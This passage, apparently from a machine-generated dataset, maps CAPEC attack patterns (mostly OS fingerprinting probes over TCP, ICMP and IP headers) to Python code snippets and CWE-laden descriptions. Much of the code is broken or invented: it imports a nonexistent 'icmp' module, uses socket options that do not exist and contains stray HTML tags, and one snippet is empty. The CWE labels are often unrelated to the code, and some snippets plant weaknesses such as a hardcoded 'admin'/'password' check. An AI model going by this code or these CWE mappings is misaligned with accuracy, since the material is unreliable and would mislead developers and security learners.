        "code_snippet": "import socket\n\ndef os_fingerprinting(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    probe = b'\\x05\\x01\\x00'  # anomalous input to solicit unique response\n    sock.send(probe)\n    response = sock.recv(1024)\n    if response.startswith(b'\\x05\\x01\\x00\\x01'):  # unique response from OS X\n        return 'OS X'\n    elif response.startswith(b'\\x05\\x01\\x00\\x02'):  # unique response from Windows\n        return 'Windows'\n    else:\n        return 'Unknown'\n\nprint(os_fingerprinting('192.168.1.100', 80))",
        "description": "This Python code snippet demonstrates OS fingerprinting by sending an anomalous input to a remote server and analyzing the response to determine the operating system. The code uses a socket to connect to the server, sends a probe designed to solicit a unique response, and then receives and analyzes the response to determine the OS. This code embodies CWE-200, CWE-497, CWE-207, CWE-319, and CWE-1323 by exposing sensitive information, transmitting sensitive data in cleartext, and behaving differently than other products with equivalent functionality."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport dpkt\nimport pcap\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n\ndef os_fingerprint(pcap_file):\n    pc = pcap.pcap(pcap_file)\n    os_signatures = {\n        'Windows': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6a',\n        'Linux': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6b',\n        'MacOS': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6c'\n    }\n\n    for ts, buf in pc:\n        eth = dpkt.ethernet.Ethernet(buf)\n        ip = eth.data\n        if isinstance(ip, dpkt.ip.IP):\n            if ip.v == 4:\n                if ip.p == dpkt.ip.IP_PROTO_TCP:\n                    tcp = ip.data\n                    if tcp.sport == 80:\n                        for os_sig in os_signatures.values():\n                            if os_sig in tcp.data:\n                                return list(os_signatures.keys())[list(os_signatures.values()).index(os_sig)]\n\n    return 'Unknown'\n\nprint(os_fingerprint('capture.pcap'))",
        "description": "This Python code snippet demonstrates a passive OS fingerprinting technique by analyzing network traffic captured in a PCAP file. It uses the dpkt and pcap libraries to parse the packets and identify the operating system based on known signatures. The code is vulnerable to CWE-200, CWE-497, CWE-1323, CWE-319, and CWE-1249 as it exposes sensitive information, transmits it in cleartext, and does not properly manage sensitive trace data. The code also has an inconsistent view of the underlying operating system."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-592: Authentication Bypass Issues\n# CWE-247: Reliance on DNS Lookups in a Security Decision\n# CWE-534: Information Exposure Through Debug Log Files\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1323: Improper Management of Sensitive Trace Data\n\n# Active OS Fingerprinting (CAPEC-312)\ndef get_os_info(ip_address):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)\n        sock.connect((ip_address, 80))\n        sock.settimeout(2)\n        os_info = sock.recv(1024)\n        logging.debug(os_info)  # CWE-534: Information Exposure Through Debug Log Files\n        return os_info\n    except Exception as e:\n        logging.error(str(e))\n        return None\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1323: Improper Management of Sensitive Trace Data\nfabric_address_map = {'protected_regions': ['0x1000', '0x2000'], 'unprotected_regions': ['0x3000', '0x4000']}\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\ndef get_dns_info(ip_address):\n    try:\n        dns_info = socket.gethostbyaddr(ip_address)\n        return dns_info\n    except Exception as e:\n        logging.error(str(e))\n        return None\n\n# CWE-592: Authentication Bypass Issues\ndef authenticate_user(username, password):\n    # Insecure authentication mechanism\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n",
        "description": "This Python code snippet demonstrates the concept of Active OS Fingerprinting (CAPEC-312) by attempting to gather OS information from a target IP address. It also incorporates various CWEs, including CWE-592 (Authentication Bypass Issues), CWE-247 (Reliance on DNS Lookups in a Security Decision), CWE-534 (Information Exposure Through Debug Log Files), CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges), and CWE-1323 (Improper Management of Sensitive Trace Data). The code intentionally includes vulnerabilities to illustrate these CWEs."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-294: Authentication Bypass by Capture-replay\ndef capture_replay_auth_bypass():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('target_server', 80))\n    message = b'captured_auth_message'\n    sock.sendall(message)\n    response = sock.recv(1024)\n    print(response.decode())\n\n# CWE-589: Call to Non-ubiquitous API\ndef non_ubiquitous_api_call():\n    try:\n        os.system('non_existent_command')\n    except Exception as e:\n        logging.debug(str(e))\n\n# CWE-534 (Deprecated): Information Exposure Through Debug Log Files\n# CWE-247 (Deprecated): Reliance on DNS Lookups in a Security Decision\n# Not included in the code snippet as they are deprecated\n\n# CAPEC-312: Active OS Fingerprinting\ndef os_fingerprinting():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('target_server', 80))\n    sock.sendall(b'OS_detection_probe')\n    response = sock.recv(1024)\n    print(response.decode())\n\nos_fingerprinting()\ncapture_replay_auth_bypass()\nnon_ubiquitous_api_call()",
        "description": "This Python code snippet demonstrates the CAPEC-312: Active OS Fingerprinting pattern by sending an OS detection probe to a target server. It also includes examples of CWE-294: Authentication Bypass by Capture-replay and CWE-589: Call to Non-ubiquitous API. The deprecated CWEs (CWE-534 and CWE-247) are not included in the code snippet."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-592: Authentication Bypass Issues (Deprecated)\n# CWE-534: Information Exposure Through Debug Log Files (Deprecated)\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1324: Sensitive Information Accessible by Physical Probing of JTAG Interface (Deprecated)\n# CWE-247: Reliance on DNS Lookups in a Security Decision (Deprecated)\n\n# Active OS Fingerprinting (CAPEC-312)\ndef get_os_info(ip_address):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)\n        sock.connect((ip_address, 80))\n        os_info = sock.recv(1024)\n        logging.debug(os_info)  # CWE-534: Information Exposure Through Debug Log Files\n        return os_info\n    except Exception as e:\n        logging.error(str(e))\n        return None\n\n# Example usage\nip_address = '192.168.1.1'\nos_info = get_os_info(ip_address)\nif os_info:\n    print('OS Info:', os_info)\n",
        "description": "This Python code snippet demonstrates Active OS Fingerprinting (CAPEC-312) by sending a raw socket request to a target IP address and capturing the response, which can reveal information about the operating system. The code also includes deprecated CWEs for context, such as CWE-592 (Authentication Bypass Issues), CWE-534 (Information Exposure Through Debug Log Files), CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges), CWE-1324 (Sensitive Information Accessible by Physical Probing of JTAG Interface), and CWE-247 (Reliance on DNS Lookups in a Security Decision)."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import os\nimport socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-605: Multiple Binds to the Same Port\n\ndef get_os_info(ip_address):\n    # Create multiple sockets to bind to the same port\n    sockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(5)]\n    for sock in sockets:\n        sock.bind((ip_address, 80))\n\n    # Send ICMP echo request packets with incrementing IDs\n    icmp_packets = [icmp.ICMPEcho(id=i, seq=i) for i in range(1, 6)]\n    for packet in icmp_packets:\n        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_PROTOCOL)\n        icmp_socket.sendto(packet, (ip_address, 0))\n\n    # Analyze the IP ID sequence generation algorithm\n    responses = []\n    for _ in range(5):\n        response = icmp_socket.recvfrom(1024)\n        responses.append(response[0][os.sys.platform == 'win32' and 20 or 16:os.sys.platform == 'win32' and 20 or 16 + 2])\n\n    # Identify the OS based on the IP ID sequence\n    if responses[0] + 1 == responses[1] and responses[1] + 1 == responses[2]:\n        return 'Windows'\n    elif responses[0] + 2 == responses[1] and responses[1] + 2 == responses[2]:\n        return 'Linux'\n    else:\n        return 'Unknown'\n\nprint(get_os_info('192.168.1.1'))",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that analyzes the IP ID sequence generation algorithm of a remote host. It creates multiple sockets to bind to the same port, sends ICMP echo request packets with incrementing IDs, and analyzes the responses to identify the operating system of the host."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\nimport struct\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-1290: Incorrect Decoding of Security Identifiers\n# CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef send_probe_packet(dst_ip, dst_port):\n    # Create a UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n    # Set the IP ID field to an arbitrary value\n    ip_id = 0x1234\n    ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, ip_id, 0, 0, 0, 0, 0, 0, 0, 0)\n\n    # Send the probe packet to the destination\n    sock.sendto(ip_hdr, (dst_ip, dst_port))\n\n    # Receive the ICMP error message\n    icmp_pkt = sock.recv(1024)\n\n    # Extract the echoed IP ID field from the ICMP error message\n    echoed_ip_id = struct.unpack('!I', icmp_pkt[28:32])[0]\n\n    # Check if the echoed IP ID field is reversed\n    if echoed_ip_id == ip_id ^ 0xFFFF:\n        print('OS fingerprinting successful!')\n    else:\n        print('OS fingerprinting failed.')\n\n# Example usage\nsend_probe_packet('192.168.1.1', 12345)",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that tests if the remote host echoes back the IP 'ID' value from the probe packet. The code creates a UDP socket, sets the IP ID field to an arbitrary value, sends the probe packet to the destination, receives the ICMP error message, and extracts the echoed IP ID field. It then checks if the echoed IP ID field is reversed, which can reveal information about the remote host's operating system."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\ndef send_udp_probe(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DF, 1)\n    sock.sendto(b'probe', (ip, port))\n    response = sock.recvfrom(1024)\n    if response[0][20] & 0x4000:\n        print(f'{ip} echoes back the DF bit')\n    else:\n        print(f'{ip} zeros out the DF bit')\n\n# Example usage\nsend_udp_probe('192.168.1.1', 8080)\n",
        "description": "Python code snippet that sends a UDP probe with the DF bit set to a remote host and checks if the response packet echoes back the DF bit, which can be used for OS fingerprinting."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport time\nimport json\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-385: Covert Timing Channel\n# CWE-208: Observable Timing Discrepancy\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef get_tcp_timestamp(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    sock.send(b'')\n    response = sock.recv(1024)\n    timestamp = response[12] << 24 | response[13] << 16 | response[14] << 8 | response[15]\n    return timestamp\n\ndef os_fingerprinting(host, port):\n    timestamps = []\n    for _ in range(10):\n        timestamp = get_tcp_timestamp(host, port)\n        timestamps.append(timestamp)\n        time.sleep(1)\n    return timestamps\n\nhost = 'example.com'\nport = 80\n\ntimestamps = os_fingerprinting(host, port)\nprint(json.dumps({'os_fingerprint': timestamps}))",
        "description": "This Python code snippet demonstrates the CAPEC of OS fingerprinting using TCP timestamps. It sends a TCP packet to a remote server, receives the response, and extracts the TCP timestamp. The code then repeats this process multiple times, analyzing the differences in timestamp values to infer the operating system of the target. This code embodies CWE-200, CWE-294, CWE-385, CWE-208, and CWE-319, as it exposes sensitive information, allows for authentication bypass, conveys information through covert timing channels, reveals security-relevant information through observable timing discrepancies, and transmits sensitive information in cleartext."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "\"",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that tests the target system's assignment of TCP sequence numbers. It sends a probe packet to an open port on the target and compares the generated sequence number with the acknowledgement number in the probe packet. The code includes vulnerabilities related to exposure of sensitive information, multiple binds to the same port, cleartext transmission of sensitive information, predictable seed in PRNG, and mutable attestation or measurement reporting data."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport json\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1283: Mutable Attestation or Measurement Reporting Data\n\ndef os_fingerprinting_probe(host, port):\n    sequence_numbers = {}\n    for i in range(10):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        syn_ack_response = sock.recv(1024)\n        sequence_number = int.from_bytes(syn_ack_response[4:8], byteorder='big')\n        sequence_numbers[sequence_number] = sequence_numbers.get(sequence_number, 0) + 1\n        sock.close()\n\n    smallest_sequence_number = min(sequence_numbers, key=sequence_numbers.get)\n    os_database = {\n        'Windows': [16384, 65536, 131072],\n        'Linux': [32768, 65536, 131072],\n        'MacOS': [16384, 65536, 131072]\n    }\n\n    for os, sequence_number_ranges in os_database.items():\n        if smallest_sequence_number in sequence_number_ranges:\n            return json.dumps({'OS': os})\n\n    return json.dumps({'OS': 'Unknown'})\n\nprint(os_fingerprinting_probe('192.168.1.1', 80))",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that sends TCP SYN packets to an open port of a remote machine, analyzes the Initial Sequence Number (ISN) in each of the SYN/ACK response packets, and determines the smallest number used by the target host when incrementing sequence numbers. The result is then compared against a database of OS behaviors to determine the OS type and/or version. The code embodies CWE-200, CWE-319, CWE-1323, CWE-497, and CWE-1283 by exposing sensitive information, transmitting sensitive data in cleartext, improperly managing sensitive trace data, exposing sensitive system information, and using mutable attestation or measurement reporting data."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport os\nimport threading\n\ndef get_os_sequence_number():\n    return int(os.urandom(4).encode('hex'), 16)\n\ndef increment_sequence_number():\n    while True:\n        time.sleep(0.01)\n        sequence_number = get_os_sequence_number()\n        # TOCTOU Race Condition: sequence_number can change between check and use\n        if sequence_number > 1000:\n            print(\"OS detected: likely Windows\")\n        elif sequence_number > 500:\n            print(\"OS detected: likely Linux\")\n        else:\n            print(\"OS detected: likely macOS\")\n\ndef timing_analysis():\n    start_time = time.time()\n    sequence_numbers = []\n    for _ in range(100):\n        sequence_numbers.append(get_os_sequence_number())\n    end_time = time.time()\n    average_rate = len(sequence_numbers) / (end_time - start_time)\n    # Covert Timing Channel: average_rate conveys information about OS\n    return average_rate\n\ndef main():\n    threads = []\n    for _ in range(5):\n        t = threading.Thread(target=increment_sequence_number)\n        threads.append(t)\n        t.start()\n    average_rate = timing_analysis()\n    # CWE-200: Exposure of Sensitive Information\n    print(\"Average sequence number increment rate: {:.2f}\".format(average_rate))\n    # CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization\n    # CWE-385: Covert Timing Channel\n    # CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n    # CWE-1298: Hardware Logic Contains Race Conditions\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet demonstrates an OS detection probe that measures the average rate of initial sequence number increments during a period of time. The sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely OS matches. The code includes CWEs 200, 367, 385, 362, and 1298."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import random\nimport time\nimport os\nimport socket\n\n# CWE-337: Predictable seed in PRNG\nseed = int(time.time() * 1000) + os.getpid()\nrandom.seed(seed)\n\n# CWE-341: Predictable from observable state\nsequence_numbers = [random.randint(0, 1000) for _ in range(10)]\n\n# CWE-353: Missing support for integrity check\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('remote_host', 8080))\n\n# CWE-211: Externally-generated error message containing sensitive information\ntry:\n    sock.send(str(sequence_numbers).encode())\nexcept Exception as e:\n    print(f'Error: {str(e)}')\n\n# CWE-200: Exposure of sensitive information to an unauthorized actor\nprint(f'Sequence numbers: {sequence_numbers}')",
        "description": "This code snippet demonstrates a vulnerable sequence number generation algorithm that can be used to identify the operating system and version of a remote host. The algorithm uses a predictable seed for the pseudo-random number generator, which can be observed by an attacker. The sequence numbers are then sent over an unsecured connection, allowing an attacker to intercept and analyze them. The code also includes an externally-generated error message that may contain sensitive system information. Finally, the sequence numbers are printed to the console, exposing sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n# CWE-353: Missing Support for Integrity Check\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef send_ecn_probe(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_ECN, 1)\n    sock.connect((host, port))\n    sock.send(b'ECN probe')\n    response = sock.recv(1024)\n    print(response.decode())\n\n    # No encryption or integrity check for the response\n    # No rate limiting for the number of probes sent\n    # No error handling for unexpected responses\n\n# Example usage\nsend_ecn_probe('example.com', 80)",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that checks if a remote host supports explicit congestion notification (ECN) messaging. It sends an ECN-enabled TCP packet to the remote host and prints the response. The code is vulnerable to several CWEs, including exposure of sensitive information, improper protection for outbound error messages, missing support for integrity checks, insufficient control of network message volume, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\nimport struct\n\n# Establish an ordinary TCP connection\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('target_ip', 80))\n\n# Send a SYN packet to initiate the connection\nsyn_packet = bytearray([0x12, 0x34])  # Initialize with some arbitrary data\nsyn_packet.extend(struct.pack('!I', 0x12345678))  # Add some arbitrary sequence number\nsock.send(syn_packet)\n\n# Receive the SYN-ACK response and extract the initial window size\nresponse = sock.recv(1024)\ninitial_window_size = struct.unpack('!H', response[14:16])[0]\n\n# Use the initial window size to infer the OS\nif initial_window_size == 5840:\n    print('The target OS is likely Windows XP.')</span>\nelif initial_window_size == 8192:\n    print('The target OS is likely Linux.')</span>\nelse:\n    print('Unable to determine the target OS.')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-121: Stack-based Buffer Overflow\n# CWE-806: Buffer Access Using Size of Source Buffer\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-188: Reliance on Data/Memory Layout\n\n# CWE-200: The initial window size is sensitive information that should not be exposed to unauthorized actors.\n# CWE-121: The use of a fixed-size buffer (syn_packet) can lead to a stack-based buffer overflow if not properly validated.\n# CWE-806: The use of struct.pack and struct.unpack can lead to buffer access issues if not properly validated.\n# CWE-1313: The use of hardware-specific features (e.g., TCP window size) can allow for activation of test or debug logic at runtime.\n# CWE-188: The code relies on the specific data/memory layout of the TCP packet, which can lead to unintended program behavior.",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that checks the initial TCP window size to infer the target OS. It establishes a TCP connection, sends a SYN packet, receives the SYN-ACK response, and extracts the initial window size. The code is vulnerable to several CWEs, including exposure of sensitive information, stack-based buffer overflow, buffer access issues, and reliance on data/memory layout."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\nimport struct\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-188: Reliance on Data/Memory Layout\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-605: Multiple Binds to the Same Port\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n\ndef get_tcp_options():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((\"0.0.0.0\", 0))\n    sock.listen(1)\n\n    conn, addr = sock.accept()\n    data = conn.recv(1024)\n    tcp_options = {}\n\n    # Parse TCP options\n    for i in range(20, len(data), 2):\n        opt_type = struct.unpack('!B', data[i:i+1])[0]\n        opt_len = struct.unpack('!B', data[i+1:i+2])[0]\n        opt_val = data[i+2:i+opt_len]\n        tcp_options[opt_type] = opt_val\n\n    return tcp_options\n\n# OS fingerprinting probe\nos_fingerprint = get_tcp_options()\nprint(os_fingerprint)\n",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that analyzes the type and order of TCP header options present in a response segment. It uses socket programming to create a TCP socket, bind it to a port, and listen for incoming connections. When a connection is established, it receives data and parses the TCP options. The code relies on the underlying hardware and memory layout to extract sensitive information about the operating system, which can be used to identify the OS. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef send_rst_packet(ip, port, message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    sock.send(b'RST ' + message.encode() + b'\\r\\n')\n    sock.close()\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-354: Improper Validation of Integrity Check Value\n\ndef calculate_checksum(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Example usage\nip = '192.168.1.1'\nport = 80\nmessage = 'Connection refused'\nchecksum = calculate_checksum(message)\nprint(f'Sending RST packet with message: {message} and checksum: {checksum}')\nsend_rst_packet(ip, port, message + ' ' + checksum)",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that sends a RST packet with a human-readable text message and a checksum. The checksum is calculated using the MD5 algorithm, but it is not validated on the receiving end, making it vulnerable to CWE-354. The transmission of the RST packet is in cleartext, making it vulnerable to CWE-319. Additionally, the code does not implement any authentication mechanism, making it vulnerable to CWE-294. The code also exposes sensitive information (the OS type) to an unauthorized actor, making it vulnerable to CWE-200."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\nimport icmp\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO_REPLY)\n\n# Set the destination IP address and port\ndest_ip = '192.168.1.1'\ndest_port = 80\n\n# Create an ICMP echo request packet\npacket = icmp.create_packet(icmp.ICMP_ECHO, '1234567890', 1, 1)\n\n# Send the packet and get the response\nsock.sendto(packet, (dest_ip, dest_port))\nresponse, addr = sock.recvfrom(1024)\n\n# Analyze the response to get the quoted data\nquoted_data = icmp.parse_packet(response)\n\n# Print the quoted data (may contain sensitive information)\nprint('Quoted data:', quoted_data)\n",
        "description": "This Python code snippet demonstrates the CAPEC technique of generating an ICMP error message and analyzing the quoted data returned in the response. The code creates an ICMP echo request packet and sends it to a target IP address and port. The response is then parsed to extract the quoted data, which may contain sensitive information. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-210 (Self-generated Error Message Containing Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), and CWE-444 (Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'))."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-211: Externally-Generated Error Message Containing Sensitive Information\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-353: Missing Support for Integrity Check\n# CWE-210: Self-generated Error Message Containing Sensitive Information\n\ndef send_icmp_error(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO_REPLY)\n    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 1)\n    sock.sendto(b'', (ip, port))\n    response, addr = sock.recvfrom(1024)\n    icmp_error = icmp.ICMPError(response)\n    if icmp_error.code == icmp.ICMP_PORT_UNREACHABLE:\n        # Analyze the integrity of data returned or 'Quoted' from the originating request\n        print(icmp_error.quote)\n\n# Example usage\nsend_icmp_error('192.168.1.1', 80)",
        "description": "Python code snippet that demonstrates the CAPEC by sending an ICMP echo request with a TTL of 1 to a target IP and port, then analyzes the integrity of data returned or 'Quoted' from the originating request in the ICMP error message."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\n\ndef send_udp_packet(dst_ip, dst_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(b'', (dst_ip, dst_port))\n\n    try:\n        response, addr = sock.recvfrom(1024)\n        if response:\n            ip_header = response[:20]\n            total_length = int.from_bytes(ip_header[2:4], byteorder='big')\n            return total_length\n    except socket.error:\n        return None\n\n# Example usage:\ndst_ip = '192.168.1.100'\ndst_port = 8080\nprint(send_udp_packet(dst_ip, dst_port))",
        "description": "This Python code snippet demonstrates the CAPEC, where an adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable' error message. The code uses the socket library to send a UDP packet to the target IP and port, and then receives the response. It extracts the total length field from the IP header of the response and returns it. This code embodies CWE-204 (Observable Response Discrepancy) as it relies on the different responses from the target machine to gather information. It also relates to CWE-130 (Improper Handling of Length Parameter Inconsistency) as it extracts the total length field from the IP header. Additionally, it is vulnerable to CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the received data, and CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive information in cleartext. Furthermore, it is vulnerable to CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it does not ensure the message was not modified during transmission."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\nimport os\nimport struct\n\n# CWE-204: Observable Response Discrepancy\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-211: Externally-Generated Error Message Containing Sensitive Information\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\ndef send_udp_probe(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1)\n    try:\n        sock.sendto(b'', (ip, port))\n        response, addr = sock.recvfrom(1024)\n        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('!BBHHH', response[:8])\n        if icmp_type == 3 and icmp_code == 3:\n            # ICMP port unreachable, extract ID from ICMP error message\n            icmp_id = struct.unpack('!H', response[36:38])[0]\n            return icmp_id\n    except socket.error:\n        return None\n\n# Example usage\nip = '192.168.1.1'\nport = 12345\nicmp_id = send_udp_probe(ip, port)\nif icmp_id is not None:\n    print(f'ICMP ID echoed back: {icmp_id}')",
        "description": "Python code snippet that sends a UDP probe to a closed port on a target system, observes the ICMP error message response, and extracts the ID field to construct an OS fingerprint."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
